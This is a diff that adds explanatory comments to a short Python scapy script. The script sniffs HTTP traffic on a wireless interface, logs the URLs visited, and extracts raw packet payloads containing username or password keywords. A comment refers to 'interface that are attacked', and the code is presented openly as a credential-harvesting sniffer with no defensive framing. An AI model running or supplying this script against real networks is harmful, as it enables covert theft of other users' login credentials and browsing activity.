@@ -1,13 +1,15 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+#sniff function
 def sniff(interface):
     scapy.sniff(iface=interface, store=False,prn=sniffed_packets)
 
-
+#URL Visited
 def website_visited(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
+#credentials scrapping
 def credentials_pass(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
@@ -16,7 +18,7 @@ def credentials_pass(packet):
             if words in user_words:
                 return load
 
-
+#packet information
 def sniffed_packets(packet):
     if packet.haslayer(http.HTTPRequest):
         url = website_visited(packet)
@@ -28,4 +30,4 @@ def sniffed_packets(packet):
 
 
 
-sniff("wlan0")
+sniff("wlan0")#here wlan0 is the interface,but it differ from interface that are attacked.
